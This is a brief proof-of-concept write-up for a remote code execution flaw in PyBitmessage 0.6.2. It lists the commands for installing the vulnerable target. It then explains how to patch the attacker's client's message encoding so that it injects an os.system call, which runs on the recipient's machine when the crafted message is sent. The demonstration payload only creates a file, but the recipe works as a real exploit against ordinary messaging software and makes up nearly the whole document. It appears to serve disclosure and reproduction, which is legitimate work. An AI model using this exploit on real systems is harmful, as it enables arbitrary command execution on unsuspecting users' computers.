### PyBitmessage RCE at 0.6.2

#### environment setting (target side)
```
$ sudo apt-get install python openssl git python-qt4 libopenssl-dev
$ wget https://github.com/Bitmessage/PyBitmessage/archive/v0.6.2.zip
$ unzip PyBitmessage-0.6.2
$ cd PyBitmessage-0.6.2/src && ./bitmessagemain.py
```

#### environment setting (attacker side)
```
- modify ./src/messagetypes/message.py
    - In function ```encode```
    - comment ```super(Message, self).encode()```
    - Add ```self.data = {"": __import__('os').system('touch /tmp/123456')}```

execute ./src/bitmessagemain.py
Write attribute message, press 'shift' button and click send to target address, will trigger RCE
```
